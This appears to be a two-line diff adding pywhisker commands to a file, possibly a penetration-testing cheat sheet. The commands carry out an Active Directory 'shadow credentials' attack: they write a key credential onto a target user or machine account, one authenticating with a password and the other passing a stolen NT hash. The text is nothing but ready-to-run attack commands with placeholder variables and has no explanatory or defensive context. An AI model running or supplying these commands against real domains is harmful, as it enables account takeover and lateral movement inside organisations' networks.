@@ -1,0 +1,2 @@
+pywhisker -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --target "$TARGET_USER" --action add
+pywhisker -v -d "$DOMAIN" -u "$USER" -H "$NT_HASH" -t "$TARGET\$" -a add
